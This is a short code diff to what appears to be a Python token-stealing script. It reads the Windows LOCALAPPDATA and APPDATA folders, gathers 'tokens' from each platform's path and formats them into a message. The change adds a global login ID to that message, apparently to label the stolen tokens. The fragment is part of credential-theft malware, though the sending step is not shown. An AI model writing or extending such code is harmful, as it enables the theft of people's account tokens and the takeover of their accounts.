@@ -27,6 +27,7 @@ if WhatTheFlip == True:
       return tokens
   
   def main():
+      global LOGINID
       local = os.getenv('LOCALAPPDATA')
       roaming = os.getenv('APPDATA')
   
@@ -45,7 +46,8 @@ if WhatTheFlip == True:
       for platform, path in paths.items():
           if not os.path.exists(path):
               continue
-  
+
+          message += f'ID:{LOGINID}'
           message += f'\n**{platform}**\n```\n'
   
           tokens = lol2(path)
